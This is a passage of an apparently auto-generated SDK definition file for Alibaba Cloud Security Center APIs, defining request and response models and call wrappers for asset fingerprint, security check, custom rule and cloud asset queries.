      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      domain?: string(name='Domain', description='The domain name of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='localhost'),
      filepath?: string(name='Filepath', description='The path to the kernel module file.

> This parameter is returned only when **Biz** is set to **lkm**.', example='/lib/modules/4****'),
      imageName?: string(name='ImageName', description='The name of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the server.', example='47.42.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The listening protocol that the website uses.

> This parameter is returned only when **Biz** is set to **web_server**.', example='tcp'),
      moduleName?: string(name='ModuleName', description='The name of the module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='alihids'),
      path?: string(name='Path', description='The path. The value of this parameter varies based on the value of **Biz**.

*   If **Biz** is set to **web_server**, the value of this parameter indicates the path to the website root directory.
*   If **Biz** is set to **autorun**, the value of this parameter indicates the path to the startup item.', example='/lib/systemd/system****'),
      pathMode?: string(name='PathMode', description='The permissions on the root directory of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='755'),
      pid?: string(name='Pid', description='The process ID (PID) of the process that runs the website service.

> This parameter is returned only when **Biz** is set to **web_server**.', example='813'),
      port?: string(name='Port', description='The port of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='80'),
      processStarted?: long(name='ProcessStarted', description='The timestamp when the process was started. Unit: milliseconds.

> This parameter is returned only when **Biz** is set to **web_server**.', example='1671186801000'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      serverType?: string(name='ServerType', description='The type of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='nginx'),
      size?: int32(name='Size', description='The size of the kernel module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='10'),
      usedByCount?: int32(name='UsedByCount', description='The number of times that the kernel module is referenced.

> This parameter is returned only when **Biz** is set to **lkm**.', example='0'),
      user?: string(name='User', description='The user who started the process of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
      webPath?: string(name='WebPath', description='The path to the root directory of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='An array that consists of the details about the asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032****'),
}

model GetAssetsPropertyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyDetailResponseBody(name='body'),
}

async function getAssetsPropertyDetailWithOptions(request: GetAssetsPropertyDetailRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemName)) {
    query['ItemName'] = request.itemName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchCriteriaList)) {
    query['SearchCriteriaList'] = request.searchCriteriaList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetsPropertyDetail(request: GetAssetsPropertyDetailRequest): GetAssetsPropertyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyDetailWithOptions(request, runtime);
}

model GetAssetsPropertyItemRequest {
  biz?: string(name='Biz', example='lkm'),
  currentPage?: int32(name='CurrentPage', example='1'),
  forceFlush?: boolean(name='ForceFlush', example='false'),
  lang?: string(name='Lang', example='en'),
  pageSize?: int32(name='PageSize', example='20'),
  searchInfo?: string(name='SearchInfo', example='/lib/systemd/s****'),
  searchItem?: string(name='SearchItem', example='path'),
}

model GetAssetsPropertyItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='45'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', example='23'),
      domain?: string(name='Domain', example='localhost'),
      moduleName?: string(name='ModuleName', example='alihids'),
      path?: string(name='Path', example='C:/Program Files/****'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
}

model GetAssetsPropertyItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyItemResponseBody(name='body'),
}

async function getAssetsPropertyItemWithOptions(request: GetAssetsPropertyItemRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetsPropertyItem(request: GetAssetsPropertyItemRequest): GetAssetsPropertyItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyItemWithOptions(request, runtime);
}

model GetBackupStorageCountResponseBody = {
  backupStorageCount?: {
    buyStorageByte?: long(name='BuyStorageByte', example='2276332666880'),
    ecsUsageStorageByte?: long(name='EcsUsageStorageByte', example='817262417803'),
    overflow?: int32(name='Overflow', example='0'),
    uniUsageStorageByte?: long(name='UniUsageStorageByte', example='7453049350'),
    usageStorageByte?: long(name='UsageStorageByte', example='839621565853'),
  }(name='BackupStorageCount'),
  requestId?: string(name='RequestId', example='33C2CCFF-4BF8-5F88-9B5C-22F932F80E5A'),
}

model GetBackupStorageCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetBackupStorageCountResponseBody(name='body'),
}

async function getBackupStorageCountWithOptions(runtime: Util.RuntimeOptions): GetBackupStorageCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetBackupStorageCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getBackupStorageCount(): GetBackupStorageCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getBackupStorageCountWithOptions(runtime);
}

model GetCheckConfigResponseBody = {
  cycleDays?: [ int32 ](name='CycleDays', description='An array that consists of days in a week on which an automatic check is performed.'),
  endTime?: int32(name='EndTime', description='The end time of the check. The value indicates a point in time. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00:** The StartTime parameter is set to 0 and the EndTime parameter is set to 6.
*   **06:00 to 12:00**: The StartTime parameter is set to 6 and the EndTime parameter is set to 12.
*   **12:00 to 18:00**: The StartTime parameter is set to 12 and the EndTime parameter is set to 18.
*   **18:00 to 24:00:** The StartTime parameter is set to 18 and the EndTime parameter is set to 24.', example='6'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5A3D5C8F-2A42-5477-BDD8-27E64B5F1739'),
  standards?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='1'),
      showName?: string(name='ShowName', description='The name of the check item.', example='Cloud service configuration management'),
      status?: string(name='Status', description='The status of the check item. Valid values:

*   **ON**: enabled
*   **OFF**: disabled', example='ON'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   **RISK**: cloud service configuration management
*   **IDENTITY_PERMISSION**: identity and permission management
*   **COMPLIANCE**: compliance', example='RISK'),
    }
  ](name='Standards', description='An array that consists of the information about the check items.'),
  startTime?: int32(name='StartTime', description='The start time of the check. The value indicates a point in time.', example='0'),
}

model GetCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckConfigResponseBody(name='body'),
}

async function getCheckConfigWithOptions(runtime: Util.RuntimeOptions): GetCheckConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckConfig(): GetCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckConfigWithOptions(runtime);
}

model GetCheckDetailRequest {
  checkId?: long(name='CheckId', example='2'),
  lang?: string(name='Lang', example='en'),
  regionId?: string(name='RegionId', example='cn-hangzhou'),
}

model GetCheckDetailResponseBody = {
  assistInfo?: {
    link?: string(name='Link', example='https://www.alibabacloud.com/help/en/resource-access-management/latest/faq-about-ram-users'),
    type?: string(name='Type', example='text'),
    value?: string(name='Value', example='Configure an IP address whitelist'),
  }(name='AssistInfo'),
  customConfigs?: [ 
    {
      defaultValue?: string(name='DefaultValue', example='12'),
      name?: string(name='Name', example='SessionTimeMax'),
      showName?: string(name='ShowName', example='Maximum session time'),
      typeDefine?: string(name='TypeDefine', example='{\\"type\\":\\"NUMBER\\",\\"range\\":[1,24]}'),
      value?: string(name='Value', example='11'),
    }
  ](name='CustomConfigs'),
  description?: {
    link?: string(name='Link', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', example='text'),
    value?: string(name='Value', example='The MSE instance does not enable authentication by default. If public network access is enabled at the same time, the data in the configuration center may be dragged and there is a security risk.'),
  }(name='Description'),
  requestId?: string(name='RequestId', example='15A6ED6A-DBFE-5255-A248-289907809BEC'),
  solution?: {
    link?: string(name='Link', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', example='text'),
    value?: string(name='Value', example='Enter the MSE product console - registration and configuration center - instance list, click the corresponding instance name to enter the instance details, find the public network whitelist setting option in the basic information, and configure the whitelist according to business needs. It is forbidden to configure 0.0.0.0 or the whitelist as null.'),
  }(name='Solution'),
}

model GetCheckDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckDetailResponseBody(name='body'),
}

async function getCheckDetailWithOptions(request: GetCheckDetailRequest, runtime: Util.RuntimeOptions): GetCheckDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckDetail(request: GetCheckDetailRequest): GetCheckDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckDetailWithOptions(request, runtime);
}

model GetCheckProcessRequest {
  taskId?: string(name='TaskId', example='5347c7b6-c85c-4070-846a-3029e08e****'),
}

model GetCheckProcessResponseBody = {
  finishCount?: int32(name='FinishCount', example='80'),
  requestId?: string(name='RequestId', example='D18B5DAD-BA97-5552-AE48-83F59D5F****'),
  totalCount?: int32(name='TotalCount', example='113'),
}

model GetCheckProcessResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckProcessResponseBody(name='body'),
}

async function getCheckProcessWithOptions(request: GetCheckProcessRequest, runtime: Util.RuntimeOptions): GetCheckProcessResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckProcess',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckProcess(request: GetCheckProcessRequest): GetCheckProcessResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckProcessWithOptions(request, runtime);
}

model GetCheckRiskStatisticsRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
}

model GetCheckRiskStatisticsResponseBody = {
  count?: int32(name='Count', example='3'),
  data?: [ 
    {
      highWarningCount?: int32(name='HighWarningCount', example='43'),
      lowWarningCount?: int32(name='LowWarningCount', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', example='29'),
      passCount?: int32(name='PassCount', example='143'),
      sceneName?: string(name='SceneName', example='SECURITY'),
      subStatistics?: [ 
        {
          alias?: string(name='Alias', example='weak_password'),
          highWarningCount?: int32(name='HighWarningCount', example='3'),
          lowWarningCount?: int32(name='LowWarningCount', example='0'),
          mediumWarningCount?: int32(name='MediumWarningCount', example='0'),
          passCount?: int32(name='PassCount', example='2'),
          totalCount?: int32(name='TotalCount', example='5'),
          typeName?: string(name='TypeName', example='weak_password'),
        }
      ](name='SubStatistics'),
      totalCount?: int32(name='TotalCount', example='219'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId', example='2C455672-2490-5211-84EC-420C7818****'),
}

model GetCheckRiskStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckRiskStatisticsResponseBody(name='body'),
}

async function getCheckRiskStatisticsWithOptions(request: GetCheckRiskStatisticsRequest, runtime: Util.RuntimeOptions): GetCheckRiskStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckRiskStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckRiskStatistics(request: GetCheckRiskStatisticsRequest): GetCheckRiskStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckRiskStatisticsWithOptions(request, runtime);
}

model GetCheckSummaryRequest {
  lang?: string(name='Lang', example='zh'),
  resourceDirectoryAccountId?: string(name='ResourceDirectoryAccountId', example='000'),
}

model GetCheckSummaryResponseBody = {
  requestId?: string(name='RequestId', example='843E4805-****-7EE12FA8DBFD'),
  summarys?: [ 
    {
      failCount?: int32(name='FailCount', example='5'),
      passCount?: long(name='PassCount', example='10'),
      standards?: [ 
        {
          failCount?: int32(name='FailCount', example='1'),
          id?: long(name='Id', example='1'),
          passCount?: int32(name='PassCount', example='1'),
          riskLevelHighCount?: int32(name='RiskLevelHighCount', example='1'),
          riskLevelLowCount?: int32(name='RiskLevelLowCount', example='1'),
          riskLevelMediumCount?: int32(name='RiskLevelMediumCount', example='1'),
          showName?: string(name='ShowName'),
        }
      ](name='Standards'),
      type?: string(name='Type', example='IDENTITY_PERMISSION'),
    }
  ](name='Summarys'),
}

model GetCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckSummaryResponseBody(name='body'),
}

async function getCheckSummaryWithOptions(request: GetCheckSummaryRequest, runtime: Util.RuntimeOptions): GetCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.resourceDirectoryAccountId)) {
    query['ResourceDirectoryAccountId'] = request.resourceDirectoryAccountId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckSummary(request: GetCheckSummaryRequest): GetCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckSummaryWithOptions(request, runtime);
}

model GetClientUserDefineRuleRequest {
  id?: long(name='Id', example='200****'),
}

model GetClientUserDefineRuleResponseBody = {
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
  userDefineRuleDetail?: {
    actionType?: string(name='ActionType', example='0'),
    cmdline?: string(name='Cmdline', example='/usr/sbin/s****'),
    filePath?: string(name='FilePath', example='/etc/pam****'),
    gmtCreate?: long(name='GmtCreate', example='167118088****'),
    gmtModified?: long(name='GmtModified', example='167118088****'),
    IP?: string(name='IP', example='10.240.XX.XX'),
    id?: long(name='Id', example='200****'),
    md5List?: string(name='Md5List', example='0c9045b5bec90f9825f1f3f64dd4****'),
    name?: string(name='Name'),
    newFilePath?: string(name='NewFilePath', example='/etc/pam****'),
    parentCmdline?: string(name='ParentCmdline', example='/usr/sbin/s****'),
    parentProcPath?: string(name='ParentProcPath', example='c:/windows/system32/i****'),
    platform?: string(name='Platform', example='linux'),
    port?: int32(name='Port', example='22'),
    portStr?: string(name='PortStr', example='80'),
    procPath?: string(name='ProcPath', example='c:/windows/system32/i****'),
    registryContent?: string(name='RegistryContent', example='*SECOH-QAD.exe*'),
    registryKey?: string(name='RegistryKey', example='HKEY_DYN_****'),
    type?: int32(name='Type', example='1'),
  }(name='UserDefineRuleDetail'),
}

model GetClientUserDefineRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetClientUserDefineRuleResponseBody(name='body'),
}

async function getClientUserDefineRuleWithOptions(request: GetClientUserDefineRuleRequest, runtime: Util.RuntimeOptions): GetClientUserDefineRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetClientUserDefineRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getClientUserDefineRule(request: GetClientUserDefineRuleRequest): GetClientUserDefineRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getClientUserDefineRuleWithOptions(request, runtime);
}

model GetCloudAssetCriteriaRequest {
  cloudAssetTypes?: [ 
    {
      assetSubType?: int32(name='AssetSubType', description='The type of the asset by source. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='2'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset.', example='9'),
    }
  ](name='CloudAssetTypes', description='The name of the filter condition. Valid values:

*   **instanceId**: the ID of the instance
*   **instanceName**: the name of an instance
*   **internetIp**: the public IP address
*   **riskStatus**: the risk status
*   **vendorRegionId**: the region ID by service provider'),
  value?: string(name='Value', description='The type of the filter condition. Valid values:

*   **input**: The filter condition needs to be specified.
*   **select**: The filter condition is an option that can be selected from the drop-down list.', example='testwww'),
}

model GetCloudAssetCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', example='instanceId'),
      type?: string(name='Type', description='GetCloudAssetCriteria', example='select'),
      values?: string(name='Values', example='fvt*'),
    }
  ](name='CriteriaList', description='The values of the search condition. This parameter is returned only if the value of **Type** is **select**.

>  If the value of **Type** is **input**, the value of this parameter is an empty string.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model GetCloudAssetCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCloudAssetCriteriaResponseBody(name='body'),
}

async function getCloudAssetCriteriaWithOptions(request: GetCloudAssetCriteriaRequest, runtime: Util.RuntimeOptions): GetCloudAssetCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cloudAssetTypes)) {
    query['CloudAssetTypes'] = request.cloudAssetTypes;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCloudAssetCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCloudAssetCriteria(request: GetCloudAssetCriteriaRequest): GetCloudAssetCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCloudAssetCriteriaWithOptions(request, runtime);
}

model GetCloudAssetDetailRequest {
  assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset.', example='0'),
  assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: Elastic Compute Service (ECS)
*   **1**: Server Load Balancer (SLB)
*   **3**: ApsaraDB RDS
*   **4**: ApsaraDB for MongoDB (MongoDB)
*   **5**: ApsaraDB for Redis (Redis)
*   **6**: Container Registry
*   **8**: Container Service for Kubernetes (ACK)
*   **9**: Virtual Private Cloud (VPC)
*   **11**: ActionTrail
*   **12**: Alibaba Cloud CDN (CDN)
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: Resource Access Management (RAM)
*   **16**: Anti-DDoS
*   **17**: Web Application Firewall (WAF)
*   **18**: Object Storage Service (OSS)
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: Microservices Engine (MSE)
*   **22**: Apsara File Storage NAS (NAS)
*   **23**: Data Security Center (DSC)
*   **24**: Elastic IP Address (EIP)
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='14'),
  cloudAssetInstances?: [ 
    {
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='sg-wz9hf86vbzbrrde7****'),
      regionId?: string(name='RegionId', description='The region where the cloud asset resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
    }
  ](name='CloudAssetInstances', description='The details of the assets.'),
  vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
*   **3**, **4**, **5**, and **7**: other cloud asset.
*   **8**: The asset is a simple application server.', example='0'),
}

model GetCloudAssetDetailResponseBody = {
  count?: int32(name='Count', description='The number of instances in the list of cloud assets returned.', example='1'),
  instances?: [ 
    {
      alarmStatus?: string(name='AlarmStatus', description='Indicates whether alerts are generated for the current cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      assetSubType?: int32(name='AssetSubType', description='The subtype of the cloud asset.', example='0'),
      assetSubTypeName?: string(name='AssetSubTypeName', description='The subtype name of the cloud asset.', example='INSTANCE'),
      assetType?: int32(name='AssetType', description='The type of the cloud asset. Valid values:

*   **0**: ECS
*   **1**: SLB
*   **3**: ApsaraDB RDS
*   **4**: MongoDB
*   **5**: Redis
*   **6**: Container Registry
*   **8**: ACK
*   **9**: VPC
*   **11**: ActionTrail
*   **12**: CDN
*   **13**: Certificate Management Service (formerly SSL Certificates Service)
*   **14**: Apsara Devops
*   **15**: RAM
*   **16**: Anti-DDoS
*   **17**: WAF
*   **18**: OSS
*   **19**: PolarDB
*   **20**: ApsaraDB RDS for PostgreSQL
*   **21**: MSE
*   **22**: NAS
*   **23**: DSC
*   **24**: EIP
*   **25**: IDaaS EIAM
*   **26**: PolarDB-X
*   **27**: Elasticsearch', example='3'),
      assetTypeName?: string(name='AssetTypeName', description='The type name of the cloud asset.', example='RDS'),
      createdTime?: long(name='CreatedTime', description='The time when the instance was created. The value is a timestamp.', example='1607365213000'),
      detailLink?: string(name='DetailLink', description='The detailed address of the cloud asset.', example='https://rdsnext.console.aliyun.com/detail/rm-uf6t6u05n6g48****/basicInfo?region=cn-shanghai'),
      instanceId?: string(name='InstanceId', description='The instance ID of the cloud asset.', example='rm-uf6t6u05n6g48****'),
      instanceName?: string(name='InstanceName', description='The instance name of the cloud asset.', example='yztest-l***'),
      internetIp?: string(name='InternetIp', description='The public IP address of the instance.', example='1.2.XX.XX'),
      regionId?: string(name='RegionId', description='The region where the cloud asset resides.

> For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hanghzou'),
      riskStatus?: string(name='RiskStatus', description='Indicates whether risks are detected on the current cloud asset. Valid values:

*   **YES**
*   **NO**', example='NO'),
      securityInfo?: string(name='SecurityInfo', description='The security information about the cloud asset.', example='{\\"seriousNum\\":0,\\"appNum\\":0,\\"baselineMedium\\":0,\\"remindNum\\":0,\\"imageVulNntf\\":0,\\"cveNum\\":0,\\"vul\\":0,\\"uuid\\":\\"rm-uf6t6u05n6g485o70\\",\\"emgNum\\":0,\\"weakPWNum\\":0,\\"imageMaliciousFileRemind\\":0,\\"imageBaselineMedium\\":0,\\"laterVulCount\\":0,\\"cmsNum\\":0,\\"imageMaliciousFileSerious\\":0,\\"agentlessMalicious\\":0,\\"suspNum\\":0,\\"imageBaselineHigh\\":0,\\"asapVulCount\\":0,\\"imageVulLater\\":0,\\"agentlessAll\\":0,\\"sysNum\\":0,\\"containerLater\\":0,\\"containerSuspicious\\":0,\\"imageBaselineNum\\":0,\\"newSuspicious\\":0,\\"nntfVulCount\\":0,\\"scaNum\\":0,\\"containerNntf\\":0,\\"health\\":0,\\"trojan\\":0,\\"suspicious\\":0,\\"imageMaliciousFileSuspicious\\":0,\\"containerRemind\\":0,\\"baselineLow\\":0,\\"imageVulAsap\\":0,\\"imageBaselineLow\\":0,\\"containerAsap\\":0,\\"agentlessBaseline\\":0,\\"agentlessVulSca\\":0,\\"agentlessVulCve\\":0,\\"containerSerious\\":0,\\"baselineHigh\\":0,\\"account\\":0,\\"baselineNum\\":6}'),
      vendor?: int32(name='Vendor', description='The service provider of the cloud asset. Valid values:

*   **0**: The asset is provided by Alibaba Cloud.
*   **1**: The asset is not provided by Alibaba Cloud.
*   **2**: The asset resides in a data center.
